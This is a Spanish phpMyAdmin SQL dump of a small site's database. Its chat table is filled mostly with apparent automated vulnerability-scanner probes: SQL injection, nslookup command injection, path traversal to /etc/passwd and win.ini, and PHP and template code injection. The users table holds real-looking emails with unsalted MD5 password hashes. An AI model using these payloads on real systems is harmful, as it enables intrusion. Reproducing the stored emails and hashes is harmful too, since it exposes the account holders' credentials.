-- phpMyAdmin SQL Dump
-- version 4.8.3
-- https://www.phpmyadmin.net/
--
-- Servidor: localhost:3306
-- Tiempo de generación: 28-05-2019 a las 18:13:15
-- Versión del servidor: 5.6.43-cll-lve
-- Versión de PHP: 7.2.7

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de datos: `unc3ns0r3d`
--

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `chat`
--

CREATE TABLE `chat` (
  `id` int(11) NOT NULL,
  `nombre` varchar(255) COLLATE utf8_spanish2_ci NOT NULL,
  `mensaje` varchar(255) COLLATE utf8_spanish2_ci NOT NULL,
  `fecha` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_spanish2_ci;

--
-- Volcado de datos para la tabla `chat`
--

INSERT INTO `chat` (`id`, `nombre`, `mensaje`, `fecha`) VALUES
(1, 'BOT Unc3ns0r3d', 'Bienvenidos Al chat de Unc3ns0r3d', '2018-07-24 23:34:30'),
(5, 'asd', 'asdasd', '2018-07-25 03:04:57'),
(6, 'Nombre', '1', '2018-08-13 23:57:12'),
(7, 'Nombre', 'response.write(9761422*9654557)', '2018-08-13 23:57:12'),
(8, 'Nombre', 'nslookup OFPQKfTm|nslookup OFPQKfTm&nslookup OFPQKfTm', '2018-08-13 23:57:12'),
(9, 'Nombre', '1', '2018-08-13 23:57:12'),
(10, 'Nombre', '\"+response.write(9761422*9654557)+\"', '2018-08-13 23:57:13'),
(11, 'Nombre', '2gFQhT1P', '2018-08-13 23:57:13'),
(12, 'Nombre', '\"nslookup AxueDsWK|nslookup AxueDsWK&nslookup AxueDsWK\"', '2018-08-13 23:57:13'),
(13, 'response.write(9717530*9185328)', '1', '2018-08-13 23:57:13'),
(14, 'Nombre', '-1 OR 2+429-429-1=0+0+0+1 -- ', '2018-08-13 23:57:13'),
(15, 'Nombre', '\nnslookup 6LEu7tOY|nslookup 6LEu7tOY&nslookup 6LEu7tOY\n', '2018-08-13 23:57:14'),
(16, 'Nombre', '-1 OR 2+603-603-1=0+0+0+1', '2018-08-13 23:57:14'),
(17, 'Nombre', '`nslookup xsClfNyB|nslookup xsClfNyB&nslookup xsClfNyB`', '2018-08-13 23:57:14'),
(18, 'Nombre', 'print `nslookup HU0KKrcs`', '2018-08-13 23:57:14'),
(19, '\"+response.write(9717530*9185328)+\"', '1', '2018-08-13 23:57:15'),
(20, 'Nombre', ';nslookup 233crXk6|nslookup 233crXk6&nslookup 233crXk6;', '2018-08-13 23:57:15'),
(21, 'Nombre', '1', '2018-08-13 23:57:15'),
(22, 'Nombre', '2ve9BHYL', '2018-08-13 23:57:15'),
(23, 'nslookup HitXk1nw|nslookup HitXk1nw&nslookup HitXk1nw', '1', '2018-08-13 23:57:15'),
(24, 'Nombre', '-1\" OR 2+857-857-1=0+0+0+1 -- ', '2018-08-13 23:57:15'),
(25, 'JWVoPX9G', '1', '2018-08-13 23:57:16'),
(26, '\"nslookup DZumquXt|nslookup DZumquXt&nslookup DZumquXt\"', '1', '2018-08-13 23:57:16'),
(27, 'Nombre', '../../../../../../../../../../etc/passwd', '2018-08-13 23:57:16'),
(28, 'Nombre', '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg', '2018-08-13 23:57:16'),
(29, '\nnslookup 1A5pLH1Y|nslookup 1A5pLH1Y&nslookup 1A5pLH1Y\n', '1', '2018-08-13 23:57:16'),
(30, 'Nombre', '../../../../../../../../../../etc/passwd\0.jpg', '2018-08-13 23:57:16'),
(31, 'Nombre', 'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n', '2018-08-13 23:57:17'),
(32, '`nslookup oG6SSDt0|nslookup oG6SSDt0&nslookup oG6SSDt0`', '1', '2018-08-13 23:57:17'),
(33, 'Nombre', '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg', '2018-08-13 23:57:17'),
(34, 'print `nslookup G78iZMFw`', '1', '2018-08-13 23:57:17'),
(35, ';nslookup Gik7BuBe|nslookup Gik7BuBe&nslookup Gik7BuBe;', '1', '2018-08-13 23:57:18'),
(36, 'Nombre', '/../..//../..//../..//../..//../..//etc/passwd\0.jpg', '2018-08-13 23:57:18'),
(37, 'Nombre', '', '2018-08-13 23:57:18'),
(38, 'Nombre', '.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd', '2018-08-13 23:57:18'),
(39, 'Nombre', '/etc/passwd', '2018-08-13 23:57:19'),
(40, 'Nombre', 'Array', '2018-08-13 23:57:19'),
(41, 'Nombre', '../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd', '2018-08-13 23:57:19'),
(42, '', '1', '2018-08-13 23:57:20'),
(43, 'Nombre', '../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd', '2018-08-13 23:57:20'),
(44, 'Nombre', '..??..??..??..??..??..??..??..??etc/passwd', '2018-08-13 23:57:20'),
(45, 'Nombre', 'invalid../../../../../../../../../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.', '2018-08-13 23:57:20'),
(46, 'Array', '1', '2018-08-13 23:57:20'),
(47, 'Nombre', 'file:///etc/passwd', '2018-08-13 23:57:21'),
(48, 'Nombre', '${10000265+9999075}', '2018-08-13 23:57:21'),
(49, 'Nombre', '/../../../../../../../etc/passwd', '2018-08-13 23:57:21'),
(50, 'Nombre', 'WEB-INF/web.xml?', '2018-08-13 23:57:21'),
(51, '${9999707+10000019}', '1', '2018-08-13 23:57:21'),
(52, 'Nombre', 'WEB-INFweb.xml?', '2018-08-13 23:57:21'),
(53, 'Nombre', 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg', '2018-08-13 23:57:22'),
(54, 'Nombre', '/WEB-INF/web.xml?', '2018-08-13 23:57:22'),
(55, 'Nombre', '1some_inexistent_file_with_long_name\0.jpg', '2018-08-13 23:57:22'),
(56, 'Nombre', 'Http://testasp.vulnweb.com/t/fit.txt', '2018-08-13 23:57:22'),
(57, 'Nombre', '../../../../../../../../../../windows/win.ini', '2018-08-13 23:57:22'),
(58, 'Nombre', '../../../../../../../../../../boot.ini', '2018-08-13 23:57:23'),
(59, 'Nombre', 'http://testasp.vulnweb.com/t/fit.txt?.jpg', '2018-08-13 23:57:23'),
(60, 'Nombre', 'testasp.vulnweb.com', '2018-08-13 23:57:23'),
(61, 'Nombre', '../../../../../../../../../../windows/win.ini\0.jpg', '2018-08-13 23:57:23'),
(62, 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg', '1', '2018-08-13 23:57:24'),
(63, 'Nombre', '????????????????????????????????????????????????windows??win.ini', '2018-08-13 23:57:24'),
(64, 'Nombre', '................windowswin.ini', '2018-08-13 23:57:24'),
(65, '1some_inexistent_file_with_long_name\0.jpg', '1', '2018-08-13 23:57:24'),
(66, 'Nombre', '................windowswin.ini', '2018-08-13 23:57:25'),
(67, 'Http://testasp.vulnweb.com/t/fit.txt', '1', '2018-08-13 23:57:25'),
(68, 'Nombre', '/.\\./.\\./.\\./.\\./.\\./.\\./windows/win.ini', '2018-08-13 23:57:25'),
(69, 'http://testasp.vulnweb.com/t/fit.txt?.jpg', '1', '2018-08-13 23:57:25'),
(70, 'Nombre', '0', '2018-08-13 23:57:16'),
(71, 'Nombre', '../..//../..//../..//../..//../..//../..//../..//../..//windows/win.ini', '2018-08-13 23:57:25'),
(72, 'testasp.vulnweb.com', '1', '2018-08-13 23:57:25'),
(73, 'Nombre', '../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././windows/win.ini', '2018-08-13 23:57:26'),
(74, 'Nombre', '1&n908297=v997063', '2018-08-13 23:57:26'),
(75, 'Nombre&n978206=v948192', '1', '2018-08-13 23:57:26'),
(76, 'Nombre', 'WEB-INF/web.xml?', '2018-08-13 23:57:27'),
(77, 'Nombre', ')', '2018-08-13 23:57:27'),
(78, 'Nombre', 'WEB-INFweb.xml?', '2018-08-13 23:57:27'),
(79, 'Nombre', '!(()&&!|*|*|', '2018-08-13 23:57:27'),
(80, 'Nombre', '/WEB-INF/web.xml?', '2018-08-13 23:57:28'),
(81, 'Nombre', '^(#$!@#$)(()))******', '2018-08-13 23:57:28'),
(82, '../../../../../../../../../../etc/passwd', '1', '2018-08-13 23:57:28'),
(83, ')', '1', '2018-08-13 23:57:28'),
(84, 'Nombre', '0', '2018-08-13 23:57:25'),
(85, '!(()&&!|*|*|', '1', '2018-08-13 23:57:29'),
(86, 'Nombre', '0', '2018-08-13 23:57:29'),
(87, '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg', '1', '2018-08-13 23:57:29'),
(88, '^(#$!@#$)(()))******', '1', '2018-08-13 23:57:29'),
(89, '../../../../../../../../../../etc/passwd\0.jpg', '1', '2018-08-13 23:57:29'),
(90, 'Nombre', 'Array', '2018-08-13 23:57:29'),
(91, 'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n', '1', '2018-08-13 23:57:29'),
(92, '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg', '1', '2018-08-13 23:57:30'),
(93, 'Array', '1', '2018-08-13 23:57:30'),
(94, '/../..//../..//../..//../..//../..//etc/passwd\0.jpg', '1', '2018-08-13 23:57:30'),
(95, 'Nombre', ';print(md5(acunetix_wvs_security_test));', '2018-08-13 23:57:31'),
(96, '.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd', '1', '2018-08-13 23:57:31'),
(97, '/etc/passwd', '1', '2018-08-13 23:57:31'),
(98, 'Nombre', '\";print(md5(acunetix_wvs_security_test));$a=\"', '2018-08-13 23:57:32'),
(99, '../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd', '1', '2018-08-13 23:57:32'),
(100, 'Nombre', '${@print(md5(acunetix_wvs_security_test))}', '2018-08-13 23:57:32'),
(101, '../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd', '1', '2018-08-13 23:57:32'),
(102, '..??..??..??..??..??..??..??..??etc/passwd', '1', '2018-08-13 23:57:33'),
(103, 'invalid../../../../../../../../../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.', '1', '2018-08-13 23:57:33'),
(104, ';print(md5(acunetix_wvs_security_test));', '1', '2018-08-13 23:57:33'),
(105, 'file:///etc/passwd', '1', '2018-08-13 23:57:34'),
(106, '\";print(md5(acunetix_wvs_security_test));$a=\"', '1', '2018-08-13 23:57:34'),
(107, '/../../../../../../../etc/passwd', '1', '2018-08-13 23:57:34'),
(108, '${@print(md5(acunetix_wvs_security_test))}', '1', '2018-08-13 23:57:34'),
(109, 'WEB-INF/web.xml?', '1', '2018-08-13 23:57:35'),
(110, 'WEB-INFweb.xml?', '1', '2018-08-13 23:57:35'),
(111, 'Nombre', '0', '2018-08-13 23:57:29'),
(112, '/WEB-INF/web.xml?', '1', '2018-08-13 23:57:35'),
(113, 'Nombre', 'http://testasp.vulnweb.com/t/xss.html?%00.jpg', '2018-08-13 23:57:35'),
(114, '../../../../../../../../../../windows/win.ini', '1', '2018-08-13 23:57:35'),
(115, 'Nombre', '0', '2018-08-13 23:57:35'),
(116, '../../../../../../../../../../boot.ini', '1', '2018-08-13 23:57:35'),
(117, 'http://testasp.vulnweb.com/t/xss.html?%00.jpg', '1', '2018-08-13 23:57:36'),
(118, '../../../../../../../../../../windows/win.ini\0.jpg', '1', '2018-08-13 23:57:36'),
(119, 'Nombre', '0', '2018-08-13 23:57:36'),
(120, 'Nombre', 'index.php', '2018-08-13 23:57:36'),
(121, 'Nombre', '0', '2018-08-13 23:57:36'),
(122, 'Nombre', 'index.php\0', '2018-08-13 23:57:36'),
(123, '????????????????????????????????????????????????windows??win.ini', '1', '2018-08-13 23:57:36'),
(124, '................windowswin.ini', '1', '2018-08-13 23:57:37'),
(125, 'Nombre', 'index.php/.', '2018-08-13 23:57:37'),
(126, 'index.php', '1', '2018-08-13 23:57:37'),
(127, '................windowswin.ini', '1', '2018-08-13 23:57:37'),
(128, '/.\\./.\\./.\\./.\\./.\\./.\\./windows/win.ini', '1', '2018-08-13 23:57:37'),
(129, 'index.php\0', '1', '2018-08-13 23:57:38'),
(130, '../..//../..//../..//../..//../..//../..//../..//../..//windows/win.ini', '1', '2018-08-13 23:57:38'),
(131, 'index.php/.', '1', '2018-08-13 23:57:38'),
(132, '../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././windows/win.ini', '1', '2018-08-13 23:57:38'),
(133, 'Nombre', 'http://hitLwrXhCDBvu.bxss.me/', '2018-08-13 23:57:38'),
(134, 'http://hitbxWiB0psg1.bxss.me/', '1', '2018-08-13 23:57:39'),
(135, 'WEB-INF/web.xml?', '1', '2018-08-13 23:57:39'),
(136, 'WEB-INFweb.xml?', '1', '2018-08-13 23:57:40'),
(137, '/WEB-INF/web.xml?', '1', '2018-08-13 23:57:40'),
(138, 'Nombre', ')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))', '2018-08-13 23:57:40'),
(139, 'Nombre', '1\0????', '2018-08-13 23:57:41'),
(140, ')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))', '1', '2018-08-13 23:57:41'),
(141, 'Nombre', '/www.vulnweb.com', '2018-08-13 23:57:41'),
(142, 'Nombre', '@@Moaek', '2018-08-13 23:57:41'),
(143, '/www.vulnweb.com', '1', '2018-08-13 23:57:41'),
(144, 'Nombre', 'JyI=', '2018-08-13 23:57:41'),
(145, 'Nombre', '<!--', '2018-08-13 23:57:42'),
(146, 'Nombre', '?\'?\"\"', '2018-08-13 23:57:42'),
(147, 'Nombre', '0', '2018-08-13 23:57:37'),
(148, 'Nombre', '(select convert(int,CHAR(65)))', '2018-08-13 23:57:43'),
(149, 'Nombre', '0', '2018-08-13 23:57:43'),
(150, '<!--', '1', '2018-08-13 23:57:43'),
(151, 'Nombre', '1', '2018-08-13 23:57:44'),
(152, '1\0????', '1', '2018-08-13 23:57:44'),
(153, 'Nombre', '1', '2018-08-13 23:57:44'),
(154, '@@kVQUn', '1', '2018-08-13 23:57:45'),
(155, 'Nombre', '1_941997', '2018-08-13 23:57:45'),
(156, 'o4y3eo2W', '1', '2018-08-13 23:57:45'),
(157, 'JyI=', '1', '2018-08-13 23:57:45'),
(158, '-1 OR 2+773-773-1=0+0+0+1 -- ', '1', '2018-08-13 23:57:45'),
(159, '-1 OR 2+167-167-1=0+0+0+1', '1', '2018-08-13 23:57:46'),
(160, '?\'?\"\"', '1', '2018-08-13 23:57:46'),
(161, 'Nombre_926113', '1', '2018-08-13 23:57:46'),
(162, '(select convert(int,CHAR(65)))', '1', '2018-08-13 23:57:46'),
(163, '1', '1', '2018-08-13 23:57:47'),
(164, '-1\" OR 2+772-772-1=0+0+0+1 -- ', '1', '2018-08-13 23:57:47'),
(165, '0', '1', '2018-08-13 23:57:48'),
(166, '0', '1', '2018-08-13 23:57:57'),
(167, '0', '1', '2018-08-13 23:57:58'),
(168, '0', '1', '2018-08-13 23:58:01'),
(169, '0', '1', '2018-08-13 23:58:08'),
(170, '0', '1', '2018-08-13 23:58:08'),
(171, '0', '1', '2018-08-13 23:58:09'),
(172, '0', '1', '2018-08-13 23:58:09'),
(173, '0', '1', '2018-08-13 23:58:16');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `dumps`
--

CREATE TABLE `dumps` (
  `DumpID` int(244) NOT NULL,
  `DumpAlt` blob NOT NULL,
  `DumpCategory` blob NOT NULL,
  `DumpAddedDate` int(244) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `planes`
--

CREATE TABLE `planes` (
  `PlanID` int(244) NOT NULL,
  `PlanName` blob NOT NULL,
  `PlanDesc` blob NOT NULL,
  `PlanPrecio` blob NOT NULL,
  `PlanLength` enum('Diario','Semanal','Mensual','Vida') CHARACTER SET latin1 DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `users`
--

CREATE TABLE `users` (
  `user_id` int(10) UNSIGNED NOT NULL,
  `name` varchar(50) NOT NULL,
  `email` varchar(60) NOT NULL,
  `key_asc` varchar(11) NOT NULL,
  `password` varchar(60) NOT NULL,
  `level` varchar(7) NOT NULL,
  `creditos` varchar(16) NOT NULL,
  `picture` varchar(250) NOT NULL,
  `created` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Volcado de datos para la tabla `users`
--

INSERT INTO `users` (`user_id`, `name`, `email`, `key_asc`, `password`, `level`, `creditos`, `picture`, `created`) VALUES
(5, 'JKDev', 'jkdev@gmail.com', 'AST-123-456', 'f6de7dae85dded412831f3496510a664', '5', '100', '', '2018-05-05 19:49:51'),
(69, 'Arqui97x', 'arqui97x@astralchk.com', 'AST-332-132', 'e10adc3949ba59abbe56e057f20f883e', '1', '100', '', '2019-05-05 19:49:51');

--
-- Índices para tablas volcadas
--

--
-- Indices de la tabla `chat`
--
ALTER TABLE `chat`
  ADD PRIMARY KEY (`id`);

--
-- Indices de la tabla `dumps`
--
ALTER TABLE `dumps`
  ADD PRIMARY KEY (`DumpID`);

--
-- Indices de la tabla `planes`
--
ALTER TABLE `planes`
  ADD PRIMARY KEY (`PlanID`);

--
-- Indices de la tabla `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`user_id`),
  ADD KEY `email` (`email`),
  ADD KEY `login` (`password`);

--
-- AUTO_INCREMENT de las tablas volcadas
--

--
-- AUTO_INCREMENT de la tabla `chat`
--
ALTER TABLE `chat`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=174;

--
-- AUTO_INCREMENT de la tabla `dumps`
--
ALTER TABLE `dumps`
  MODIFY `DumpID` int(244) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de la tabla `planes`
--
ALTER TABLE `planes`
  MODIFY `PlanID` int(244) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de la tabla `users`
--
ALTER TABLE `users`
  MODIFY `user_id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=70;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
